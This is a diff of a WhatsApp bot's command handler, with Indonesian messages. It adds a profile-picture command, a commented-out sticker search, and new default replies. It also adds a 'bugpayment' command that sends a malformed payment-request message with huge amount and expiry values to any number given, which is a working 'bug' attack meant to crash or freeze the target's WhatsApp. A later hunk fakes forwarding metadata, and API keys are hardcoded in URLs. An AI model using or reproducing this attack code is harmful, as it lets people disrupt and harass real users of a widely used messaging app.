@@ -19,7 +19,7 @@ const speed = require('performance-now')
 const { performance } = require('perf_hooks')
 const { Primbon } = require('scrape-primbon')
 const primbon = new Primbon()
-const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
+const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./lib/myfunc')
 
 // read database
 let tebaklagu = db.data.game.tebaklagu = []
@@ -1386,6 +1386,32 @@ break
                 m.reply(mess.success)
                 }
                 break
+                case 'ppfull':{
+if (!isCreator) throw mess.owner
+                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
+                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
+                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
+                let media = await satria.downloadAndSaveMediaMessage(quoted)
+var { img } = await generateProfilePicture(media)
+await satria.query({
+tag: 'iq',
+attrs: {
+to: botNumber,
+type:'set',
+xmlns: 'w:profile:picture'
+},
+content: [
+{
+tag: 'picture',
+attrs: { type: 'image' },
+content: img
+}
+]
+})
+fs.unlinkSync(media)
+reply(`Sukses `)
+}
+break
            case 'setppgroup': case 'setppgrup': case 'setppgc': {
                 if (!m.isGroup) throw mess.group
                 if (!isAdmins) throw mess.admin
@@ -2952,6 +2978,15 @@ let anjay = `https://zenzapis.xyz/creator/changemymind?text=${tes1}&apikey=satga
                 satria.sendMessage(m.chat, { audio: { url : "https://a.uguu.se/YXAzeUvV.mp3"}, mimetype:'audio/mpeg', ptt:true }, {quoted:floc})
                 }
             break
+            /*
+            case 'stiksearch': case 'sts': case 'stikersearch': case 'stickersearch':{
+             if (!text) throw `what sticker are you looking for?`
+             let media = await fetchJson(`https://zenzapis.xyz/searching/stickerline?query=${q}&apikey=satganzdevs`)
+             let medium = media.result.sticker[Math.floor(Math.random() * media.result.sticker.length)]
+            	satria.sendImageAsSticker(m.chat, { image : { url : medium }}, m )
+            }
+            break
+            */
             case 'meme':{
             let buttons = [
                     {buttonId: `meme`, buttonText: {displayText: 'Next Meme'}, type: 1}
@@ -4318,24 +4353,38 @@ satria.sendMessage(`${spar}@s.whatsapp.net`, { text: `p`, contextInfo:{"external
 let terern = text.split("|")[1]
 reply(`Success Attack Target During Attack ${terern} Minutes`)
 break
+case 'bugpayment':{
+if (!text) throw m.reply(`Examples of use : ${command} >Target<`) 
+let nomore = q.replace(/[^0-9]/g, "").replace(/[^0-9]/g, "")
+var satgnz = "6281316701742"
+let isLinkThisGc = new RegExp(satgnz, 'i')
+let isgclink = isLinkThisGc.test(m.text)
+ if (isgclink) return m.reply(`You Can't Attack My Owner`)
+satria.relayMessage(`${nomore}@s.whatsapp.net`, { requestPaymentMessage: { Message: { TextMessage: { text: "hi", currencyCodeIso4217: 'IDR', requestFrom: '6281316701742@s.whatsapp.net', expiryTimestamp: 6281316701742, amount: 6281316701742, background: thumb }}}}, {})
+reply(`Success Send Payment Bug To ${nomore}`)
+}
+break
             default:
-            if (budy.includes('pagi')) {
-            let gomen = { url : "https://a.uguu.se/KXMnrOaN.mp3" }
-            satria.sendMessage(m.chat, {audio: gomen, mimetype:'audio/mpeg', ptt:true }, {quoted:floc})
-            }
-            if (budy.includes('turu')) {
-            satria.sendMessage(m.chat, {audio: {url : "https://a.uguu.se/JHykYYEG.mp3"}, mimetype:'audio/mpeg', ptt:true }, {quoted:floc})
+            if (/^.*(bot|BOT|Bot|bOt|BoT)/.test(m.text)) {
+            satria.sendMessage(m.chat, {audio: { url : "https://a.uguu.se/neNKFssY.mp3"}, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
+mediaType:  2,
+mediaUrl: 'https://wa.me/6281316701742',
+title: '「 ❔ 」',
+body: ucapanWaktu,
+sourceUrl: "https://bit.ly/SatganzDevs", thumbnail: thumb
+  }
+ }}, { quoted: m })
             }
             if (budy.startsWith('.')) {
             	reply(`Perintah *${command}* Belum Da di Daftar Menu!`)
             await sleep(99)
             let gomen = fs.readFileSync('./media/gomen.mp3')
             satria.sendMessage(m.chat, {audio: gomen, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
-mediaType:  1,
+mediaType:  2,
 mediaUrl: 'https://wa.me/6281316701742',
 title: '「 ❔ 」',
 body: ucapanWaktu,
-sourceUrl: `https://${global.web}`, thumbnail: thumb
+sourceUrl: "https://bit.ly/SatganzDevs", thumbnail: thumb
   }
  }}, { quoted: m })
             }
@@ -4385,8 +4434,8 @@ sourceUrl: `https://${global.web}`, thumbnail: thumb
                         m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                             contextInfo: {
                                 ...m.msg.contextInfo,
-                                forwardingScore: 0,
-                                isForwarded: true,
+                                forwardingScore: 99999999999999999999,
+                                isForwarded: false,
                                 participant: other
                             }
                         } : {})
